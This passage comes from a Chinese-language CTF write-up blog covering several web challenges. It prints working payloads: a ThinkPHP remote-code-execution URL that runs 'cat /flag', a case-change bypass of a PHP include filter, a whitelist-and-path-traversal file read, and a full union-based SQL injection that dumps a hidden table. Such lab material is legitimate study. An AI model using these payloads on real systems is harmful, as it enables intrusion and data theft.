src=\"/post/wp-Gongfang/image-20220630175432667.png\" alt=\"image-20220630175432667\"></p>\n<p>用cat显示出来</p>\n<p><code>http://111.200.241.244:57210/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></p>\n<p>得到flag</p>\n<h2 id=\"8-Web-php-include\"><a href=\"#8-Web-php-include\" class=\"headerlink\" title=\"8.Web_php_include\"></a>8.Web_php_include</h2><h3 id=\"1-题目描述-17\"><a href=\"#1-题目描述-17\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-15\"><a href=\"#2-wp-15\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>这道题先了解<a href=\"../../../../2022/05/28/Web-study\">php伪协议</a></p>\n<p>看名字很清楚是到文件包含的题目</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'hello'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$page</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'page'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"php://\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token variable\">$page</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>先分析一下函数</p>\n<p><code>strstr()：</code><br><code>定义和用法：</code><br><code>搜索字符串在另一个字符串中是否存在，如果是，返回字符串及剩余部分，否则返回false。</code><br><code>区分大小写，stristr()函数不区分大小写</code><br><code>语法：</code><br><code>strstr(string,search,before_search)</code><br><code>string:必需，被搜索的字符串</code><br><code>search:必需，要搜索的字符串，若是数字，则搜索对应的ASCII值的字符</code><br><code>before_search：可选，默认为“false”，若为true,将返回search参数第一次出现之前的字符串部分</code></p>\n<p><code>str_replace():</code><br><code>定义和用法：</code><br><code>以其它字符替换字符串中的一些字符（区分大小写）</code><br><code>语法：</code><br><code>str_replace(find,replace,string,count)</code><br><code>find,必需，要查找的值</code><br><code>replace，必需，要替换的值</code><br><code>string，必需，被搜索的字符串</code><br><code>count，可选，替换次数</code></p>\n<p>也就是说，如果page&#x3D;的内容里有php:&#x2F;&#x2F;就会被替换为空，也就是过滤</p>\n<p>但是看源码我们知道，它只过滤了小写，所以可以用大小写绕过，这里用的php:&#x2F;&#x2F;input</p>\n<p>*这道题好像包括php:&#x2F;&#x2F;input，有5种方法，建议看看这篇文章<a href=\"https://blog.csdn.net/yingyugo/article/details/109783035?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-109783035-blog-122854291.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-109783035-blog-122854291.pc_relevant_paycolumn_v3&utm_relevant_index=1\">Web_php_include总结五种解法大同小异</a></p>\n<p><code>http://111.200.241.244:59492/?page=PHP://input</code></p>\n<p>php:&#x2F;&#x2F;input读取POST数据， 我先用hackbar，发现没有反应</p>\n<p><img src=\"/post/wp-Gongfang/image-20220626215410026.png\" alt=\"image-20220626215410026\"></p>\n<p>看了一篇大佬的wp，说是被过滤了，所以不行</p>\n<p>但这里可以用burp试试，得到flag文件名</p>\n<p>fl4gisisish3r3.php</p>\n<p><img src=\"/post/wp-Gongfang/image-20220626222916776.png\" alt=\"image-20220626222916776\"></p>\n<p>显示fl4gisisish3r3.php内容</p>\n<p><img src=\"/post/wp-Gongfang/image-20220626223253399.png\" alt=\"image-20220626223253399\"></p>\n<p>得到flag</p>\n<h2 id=\"9-supersqli\"><a href=\"#9-supersqli\" class=\"headerlink\" title=\"9.supersqli\"></a>9.supersqli</h2><h3 id=\"1-题目描述-18\"><a href=\"#1-题目描述-18\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>随便注</p>\n<h3 id=\"2）wp-3\"><a href=\"#2）wp-3\" class=\"headerlink\" title=\"2）wp\"></a>2）wp</h3><p>这道题之前在buuctf上做过，考察堆叠注入，wp可以在<a href=\"../../../../2022/06/21/buuctf-wp\">buuctf-wp</a>看一下</p>\n<h2 id=\"10-warmup\"><a href=\"#10-warmup\" class=\"headerlink\" title=\"10.warmup\"></a>10.warmup</h2><h3 id=\"1-题目描述-19\"><a href=\"#1-题目描述-19\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2）wp-4\"><a href=\"#2）wp-4\" class=\"headerlink\" title=\"2）wp\"></a>2）wp</h3><p>开始就只有一张图片，先看一下它源码</p>\n<p><img src=\"/post/wp-Gongfang/image-20220703104834305.png\" alt=\"image-20220703104834305\"></p>\n<p>看到有一个source.php文件</p>\n<p>访问<code>http://111.200.241.244:59132/source.php</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//__FILE__常量返回文件的完整路径和文件名，高亮显示</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">emmm</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$whitelist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"source\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"source.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hint\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"hint.php\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">//白名单</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">//如果不存在（isset()）或者不为字符串（is_string()）</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">//如果在白名单里</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n\n            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span>\n                <span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//要截取的字符串</span>\n                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//起始位置</span>\n                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//截取长度</span>\n                <span class=\"token comment\">//返回？在$page.?字符串中出现的位置</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">//如果在白名单里</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n\n            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//解码</span>\n            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span>\n                <span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//要截取的字符串</span>\n                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//起始位置</span>\n                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//截取长度</span>\n                <span class=\"token comment\">//返回？在$_page字符串中第一次出现的位置</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">//如果在白名单里</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token class-name static-context\">emmm</span><span class=\"token operator\">::</span><span class=\"token function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">//如果传的参数不是空的，并且是字符串，调用checkFile函数返回为true</span>\n        <span class=\"token keyword\">include</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//对传来的参数进行包含</span>\n        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//否则就输出图片</span>\n    <span class=\"token punctuation\">&#125;</span>  \n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>没有flag的线索，但看到一个hint.php文件</p>\n<p>访问<code>http://111.200.241.244:59132/hint.php</code></p>\n<p><img src=\"/post/wp-Gongfang/image-20220703105453437.png\" alt=\"image-20220703105453437\"></p>\n<p>知道了flag在ffffllllaaaagggg文件里</p>\n<p>然后开始分析source.php代码（可以看看源码注释）</p>\n<p>分析：</p>\n<p>我们可以看到，关键在于 checkfile 函数，要让它返回为ture才能够实现文件包含，我们能控制的变量是file，<u>page变量实际是file变量的形参，由checkfile函数传过去</u>，也就是file变量要满足所有的if条件，才能返回ture而不是只显示图片</p>\n<p>先分析checkfile函数里的四个if条件满足要求，避免执行return false</p>\n<p>第一个if</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">//如果不存在（isset()）或者不为字符串（is_string()）</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>因为语句里存在return false，所以要传入的<u>变量page存在且为字符串</u>，使得if语句为假，就不会执行return false，这个本身就满足，所以可以不考虑</p>\n<p>第二个if</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n<span class=\"token comment\">//如果在白名单里</span>\n    <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>要我们传入的参数是source.php或者hint.php，满足whitelist(白名单)，如果还不满足继续往下判断，满足就跳出checkfile函数</p>\n<p>第三个if，结合其前面代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span>\n               <span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//要截取的字符串</span>\n               <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//起始位置</span>\n               <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//截取长度</span>\n               <span class=\"token comment\">//返回？在$page.?字符串中出现的位置</span>\n           <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n           <span class=\"token comment\">//如果在白名单里</span>\n               <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>取传入page参数首次出现?前的部分，再进行白名单判断，即是否存在source.php或者hint.php，如果还不满足继续往下判断，满足就跳出checkfile函数</p>\n<p>第四个if</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//解码</span>\n            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span>\n                <span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//要截取的字符串</span>\n                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//起始位置</span>\n                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//截取长度</span>\n                <span class=\"token comment\">//返回？在$_page字符串中第一次出现的位置</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">//如果在白名单里</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>先把参数进行url解码，然后和第三个if一样，取传入page参数首次出现?前的部分，再进行白名单判断，即是否存在source.php或者hint.php，如果还不满足继续往下判断，满足就跳出checkfile函数</p>\n<hr>\n<p>至于</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token class-name static-context\">emmm</span><span class=\"token operator\">::</span><span class=\"token function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>只要file不为空，且为字符串即可，可以满足不考虑</p>\n<p>所以只有下面两种</p>\n<p><code>http://111.200.241.244:59132/source.php?file=source.php?(payload)</code></p>\n<p><code>http://111.200.241.244:59132/source.php?file=hint.php?(payload)</code></p>\n<p>由PHP4-7的include函数的特性</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200319173934886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l5Ynp6eg==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>在payload上加上<code>/../../../../../../ffffllllaaaagggg</code>，这里可只加四层..&#x2F;即可，但也可以加多个返回上个目录，也可以依次试试</p>\n<p>得到flag</p>\n<p><strong>补充</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。\n实例\n从字符串中返回 &quot;菜鸟&quot;：\n&lt;?php\necho mb_substr(&quot;菜鸟教程&quot;, 0, 2);\n&#x2F;&#x2F; 输出：菜鸟\n?&gt;\n----------------\nmb_strpos()：返回要查找的字符串在别一个字符串中首次出现的位置\nmb_strpos (haystack ,needle )\nhaystack：要被检查的字符串。\nneedle：要搜索的字符串。\n----------------\n in_array函数功能检查数组中是否存在某个值<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"11-NewsCenter\"><a href=\"#11-NewsCenter\" class=\"headerlink\" title=\"11.NewsCenter\"></a>11.NewsCenter</h2><h3 id=\"1-题目描述-20\"><a href=\"#1-题目描述-20\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2）wp-5\"><a href=\"#2）wp-5\" class=\"headerlink\" title=\"2）wp\"></a>2）wp</h3><p>该题考查的是SQL注入，如果不清楚开始看到输入框，就应该试试各种方式，分析存在什么漏洞，比如xss或sql等等</p>\n<p>开始先判断sql注入存在</p>\n<p>输入**1’**，报错返回空白页面</p>\n<p>然后判断字段数</p>\n<p>当输入语句为</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1&#39; order by 4#<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>返回空白页面，于是判断字段数为3</p>\n<p>然后联合注入</p>\n<p>先判断数据爆出口</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-1&#39;  union select 1,2,3#<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/wp-Gongfang/image-20220703204402467.png\" alt=\"image-20220703204402467\"></p>\n<p>得出数据在2，3位置处输出</p>\n<p>然后按照标准sql注入流程即可</p>\n<p>先看数据库和版本号</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-1&#39;  union select 1,database(),version()#<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/wp-Gongfang/image-20220703204520282.png\" alt=\"image-20220703204520282\"></p>\n<p>得到数据库名为<strong>news</strong>，MySQL版本为<strong>5.5.61</strong></p>\n<p>然后查看news库的表名</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;news&quot;),3#<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/wp-Gongfang/image-20220703205326915.png\" alt=\"image-20220703205326915\"></p>\n<p>得到两个表名<strong>news</strong>和<strong>secret_table</strong></p>\n<p>flag肯定在<strong>secret_table</strong>里</p>\n<p>查看<strong>secret_table</strong>列</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-1&#39;  union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;secret_table&quot;),3#<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/wp-Gongfang/image-20220703205526044.png\" alt=\"image-20220703205526044\"></p>\n<p>看到fl4g，尝试查看其数据</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-1&#39;  union select 1,(select fl4g  from secret_table),3#<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/wp-Gongfang/image-20220703205758800.png\" alt=\"image-20220703205758800\"></p>\n<p>得到flag</p>\n<p>这里用sqlmap也可以，但还是试试手工注入更好</p>\n<h2 id=\"12-NaNaNaNNaN-Batman\"><a href=\"#12-NaNaNaNNaN-Batman\" class=\"headerlink\" title=\"12.NaNaNaNNaN-Batman\"></a>12.NaNaNaNNaN-Batman</h2><h3 id=\"1-题目描述-21\"><a href=\"#1-题目描述-21\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2）wp-6\"><a href=\"#2）wp-6\" class=\"headerlink\" title=\"2）wp\"></a>2）wp</h3><p>这个开始有点懵，借鉴了大佬的wp，才理解了一些，需要wp可以认真看看这篇文章，以下只加上个人理解和个人认为文章重点</p>\n<p><a href=\"https://blog.csdn.net/qq_41617034/article/details/91946853\">原文链接</a></p>\n<p>js源代码分析：</p>\n<p>_等于一个$函数内容</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">_&#x3D;&#39;function $()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>一个输入框</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;input id&#x3D;&quot;c&quot;&gt;&lt; onclick&#x3D;$()&gt;Ok&lt;&#x2F;&gt;\\&#39;);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">***核心代码：***</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">eval函数，这是执行函数；这里执行了_变量中的内容也就是&#39;&#39;中的内容，但是，要注意的是，它并没有执行$()函数，仅仅执行了字符串而已（从而导致乱码），因而页面html页面没有任何显示，只显示了input标签的内容，但是我们想让源代码正常显示出来，不进行执行，那么，我们就用到了alert弹窗（将eval函数改为alert），将乱码的$()函数源码完整显示出来</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">这里可以使用浏览器打开，也可以将修改后的源代码放入控制台执行（放入控制台需要注意删除script前后标签）</span></span></code></pre></div><p>浏览器打开： <img src=\"https://img-blog.csdnimg.cn/20200306183621819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers 